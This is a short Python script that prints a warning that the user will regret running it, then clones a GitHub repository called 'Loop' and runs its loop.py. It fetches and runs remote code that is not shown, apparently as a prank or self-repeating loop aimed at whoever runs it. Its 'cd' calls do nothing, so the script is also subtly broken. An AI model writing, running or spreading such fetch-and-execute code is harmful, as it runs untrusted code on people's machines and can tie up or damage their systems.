import os

print("You'll regret running this!")
os.system('mkdir round')
os.system('cd round')
os.system('''git clone https://github.com/xattsec/Loop.git .''')
os.system('cd Loop')
os.system('python3 loop.py')
os.system('cd round')
